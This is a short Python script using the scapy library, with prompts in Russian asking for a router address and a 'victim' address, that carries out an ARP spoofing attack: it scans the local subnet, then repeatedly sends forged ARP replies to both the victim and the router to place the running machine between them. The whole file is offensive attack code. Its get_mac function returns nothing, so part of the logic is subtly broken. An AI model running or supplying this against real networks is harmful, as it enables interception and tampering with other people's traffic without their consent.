import scapy.all as scapy
import time


route = input('Введите ip адрес роутера (прим: X.X.X.X): ')

while True:
    print(scapy.arping(route+'/24'))
    target = input('Введите ip адрес жертвы (прим: X.X.X.X): ')
    if target == '' or target == ' ':
        continue
    else:
        break

def get_mac(ip):
    scapy.arping(ip)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc= spoof_ip)
    scapy.send(packet)

while True:
    spoof(target, route)
    spoof(route, target)
    time.sleep(2)